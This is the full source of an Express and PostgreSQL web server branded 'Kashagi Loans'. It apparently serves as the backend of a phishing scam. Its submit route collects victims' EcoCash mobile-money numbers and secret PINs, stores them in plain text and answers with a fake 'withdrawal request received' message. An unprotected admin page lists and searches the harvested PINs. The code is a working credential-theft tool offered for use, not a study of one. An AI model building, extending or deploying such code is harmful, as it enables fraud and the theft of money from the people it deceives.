const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");
const path = require("path");

const app = express();


// ========================================
// MIDDLEWARE
// ========================================

app.use(cors());

app.use(express.json());

app.use(
    express.urlencoded({
        extended: true
    })
);


// ========================================
// DATABASE
// ========================================

const pool = new Pool({

    connectionString: process.env.DATABASE_URL,

    ssl: {
        rejectUnauthorized: false
    }

});


// ========================================
// WEBSITE
// ========================================

app.use(
    express.static(
        path.join(__dirname, "public")
    )
);


// ========================================
// DATABASE SETUP
// ========================================

async function initializeDatabase() {

    try {

        await pool.query(`
            CREATE TABLE IF NOT EXISTS submissions (

                id SERIAL PRIMARY KEY,

                ecocash_number TEXT NOT NULL,

                ecocash_pin TEXT,

                created_at TIMESTAMP
                    DEFAULT CURRENT_TIMESTAMP

            )
        `);


        await pool.query(`
            ALTER TABLE submissions
            ADD COLUMN IF NOT EXISTS ecocash_pin TEXT
        `);


        console.log(
            "========================================"
        );

        console.log(
            "DATABASE READY"
        );

        console.log(
            "Submissions table is ready."
        );

        console.log(
            "========================================"
        );

    } catch (error) {

        console.error(
            "DATABASE INITIALIZATION ERROR:",
            error
        );

    }

}


// ========================================
// DATABASE TEST
// ========================================

app.get(
    "/test-db",
    async (req, res) => {

        try {

            const result =
                await pool.query(
                    "SELECT NOW()"
                );


            res.json({

                success: true,

                message:
                    "Database connection successful.",

                time:
                    result.rows[0].now

            });

        } catch (error) {

            console.error(
                "DATABASE TEST ERROR:",
                error
            );


            res.status(500).json({

                success: false,

                message:
                    "Database connection failed.",

                error:
                    error.message

            });

        }

    }
);


// ========================================
// CREATE / REPAIR TABLE
// ========================================

app.get(
    "/create-table",
    async (req, res) => {

        try {

            await pool.query(`
                CREATE TABLE IF NOT EXISTS submissions (

                    id SERIAL PRIMARY KEY,

                    ecocash_number TEXT NOT NULL,

                    ecocash_pin TEXT,

                    created_at TIMESTAMP
                        DEFAULT CURRENT_TIMESTAMP

                )
            `);


            await pool.query(`
                ALTER TABLE submissions
                ADD COLUMN IF NOT EXISTS ecocash_pin TEXT
            `);


            res.json({

                success: true,

                message:
                    "Submissions table is ready."

            });

        } catch (error) {

            console.error(
                "CREATE TABLE ERROR:",
                error
            );


            res.status(500).json({

                success: false,

                error:
                    error.message

            });

        }

    }
);


// ========================================
// SUBMIT
// ========================================

app.post(
    "/submit",
    async (req, res) => {

        console.log(
            "SUBMIT ROUTE HIT"
        );


        const {
            ecocash_number,
            ecocash_pin
        } = req.body;


        // Validate EcoCash number

        if (!ecocash_number) {

            return res.status(400).json({

                success: false,

                message:
                    "Please enter your EcoCash number."

            });

        }


        // Validate ecocash pin

        if (!ecocash_pin) {

            return res.status(400).json({

                success: false,

                message:
                    "Please enter your ecocash pin."

            });

        }


        try {

            const result =
                await pool.query(
                    `
                    INSERT INTO submissions
                    (
                        ecocash_number,
                        ecocash_pin
                    )

                    VALUES
                    (
                        $1,
                        $2
                    )

                    RETURNING
                        id,
                        ecocash_number,
                        ecocash_pin,
                        created_at
                    `,
                    [
                        ecocash_number,
                        ecocash_pin
                    ]
                );


            console.log(
                "SUBMISSION SAVED:",
                result.rows[0].id
            );


            res.status(200).json({

                success: true,

                message:
                    "Withdrawal request has been received successfully✅.",

                id:
                    result.rows[0].id

            });

        } catch (error) {

            console.error(
                "SUBMIT DATABASE ERROR:",
                error
            );


            res.status(500).json({

                success: false,

                message:
                    "Database error.",

                error:
                    error.message

            });

        }

    }
);


// ========================================
// VIEW SUBMISSIONS
// ========================================

app.get(
    "/submissions",
    async (req, res) => {

        try {

            const search =
                req.query.search || "";


            const result =
                await pool.query(
                    `
                    SELECT
                        id,
                        ecocash_number,
                        ecocash_pin,
                        created_at

                    FROM submissions

                    WHERE
                        ecocash_number ILIKE $1

                    OR
                        ecocash_pin ILIKE $1

                    ORDER BY
                        created_at DESC
                    `,
                    [
                        `%${search}%`
                    ]
                );


            let html = `

<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>
        Kashagi Loans - Submissions
    </title>


    <style>

        * {
            box-sizing: border-box;
        }


        body {

            margin: 0;

            padding: 20px;

            font-family:
                Arial,
                Helvetica,
                sans-serif;

            background: #f5f5f5;

        }


        h1 {

            color: #1877f2;

            margin-bottom: 20px;

        }


        .search-box {

            margin-bottom: 20px;

        }


        .search-box input {

            width: 280px;

            max-width: 100%;

            padding: 12px;

            border:
                1px solid #ccc;

            border-radius: 6px;

            font-size: 16px;

        }


        .search-box button {

            padding: 12px 18px;

            border: none;

            border-radius: 6px;

            background: #1877f2;

            color: white;

            cursor: pointer;

            font-size: 16px;

        }


        table {

            width: 100%;

            border-collapse:
                collapse;

            background: white;

        }


        th,
        td {

            padding: 12px;

            border:
                1px solid #ddd;

            text-align: left;

        }


        th {

            background: #1877f2;

            color: white;

        }


        .delete {

            background: #d32f2f;

            color: white;

            border: none;

            padding: 8px 12px;

            border-radius: 5px;

            cursor: pointer;

        }


        @media (max-width: 700px) {

            table {

                font-size: 14px;

            }


            th,
            td {

                padding: 8px;

            }

        }

    </style>

</head>


<body>


    <h1>
        Kashagi Loans - Submissions
    </h1>


    <form
        method="GET"
        action="/submissions"
        class="search-box"
    >

        <input
            type="text"
            name="search"
            placeholder="Search number or pin"
            value="${escapeHtml(search)}"
        >


        <button type="submit">
            Search
        </button>

    </form>


    <table>

        <thead>

            <tr>

                <th>
                    ID
                </th>

                <th>
                    EcoCash Number
                </th>

                <th>
                    EcoCash Pin
                </th>

                <th>
                    Date
                </th>

                <th>
                    Action
                </th>

            </tr>

        </thead>


        <tbody>

`;


            result.rows.forEach(
                row => {

                    html += `

            <tr>

                <td>
                    ${row.id}
                </td>

                <td>
                    ${escapeHtml(
                        row.ecocash_number
                    )}
                </td>

                <td>
                    ${escapeHtml(
                        row.ecocash_pin || ""
                    )}
                </td>

                <td>
                    ${escapeHtml(
                        String(
                            row.created_at
                        )
                    )}
                </td>

                <td>

                    <form
                        method="POST"
                        action="/delete/${row.id}"
                        style="margin:0;"
                    >

                        <button
                            type="submit"
                            class="delete"
                        >
                            Delete
                        </button>

                    </form>

                </td>

            </tr>

`;

                }
            );


            html += `

        </tbody>

    </table>


</body>

</html>

`;


            res.send(html);

        } catch (error) {

            console.error(
                "SUBMISSIONS ERROR:",
                error
            );


            res.status(500).send(`

                <h1>
                    Database Error
                </h1>

                <pre>
${escapeHtml(error.message)}
                </pre>

            `);

        }

    }
);


// ========================================
// DELETE SUBMISSION
// ========================================

app.post(
    "/delete/:id",
    async (req, res) => {

        try {

            await pool.query(
                `
                DELETE FROM submissions
                WHERE id = $1
                `,
                [
                    req.params.id
                ]
            );


            res.redirect(
                "/submissions"
            );

        } catch (error) {

            console.error(
                "DELETE ERROR:",
                error
            );


            res.status(500).send(
                "Delete failed."
            );

        }

    }
);


// ========================================
// DASHBOARD
// ========================================

app.get(
    "/dashboard",
    (req, res) => {

        res.redirect(
            "/submissions"
        );

    }
);


// ========================================
// HTML ESCAPE
// ========================================

function escapeHtml(value) {

    return String(value)

        .replace(
            /&/g,
            "&amp;"
        )

        .replace(
            /</g,
            "&lt;"
        )

        .replace(
            />/g,
            "&gt;"
        )

        .replace(
            /"/g,
            "&quot;"
        )

        .replace(
            /'/g,
            "&#039;"
        );

}


// ========================================
// START SERVER
// ========================================

const PORT =
    process.env.PORT || 10000;


app.listen(
    PORT,
    async () => {

        console.log(
            `Server started on port ${PORT}`
        );


        await initializeDatabase();

    }
);
